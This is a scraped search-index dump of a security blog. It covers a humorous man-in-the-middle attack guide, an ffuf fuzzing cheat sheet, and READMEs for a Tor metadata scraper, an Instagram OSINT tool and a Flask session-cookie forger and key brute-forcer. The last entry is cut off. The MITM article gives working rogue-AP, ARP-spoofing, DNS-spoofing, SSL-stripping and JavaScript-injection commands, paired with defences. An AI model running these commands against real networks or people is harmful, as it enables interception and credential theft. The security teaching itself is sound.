own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). Final Thoughts FFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\n","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eFFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\u003c/p\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge, I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s 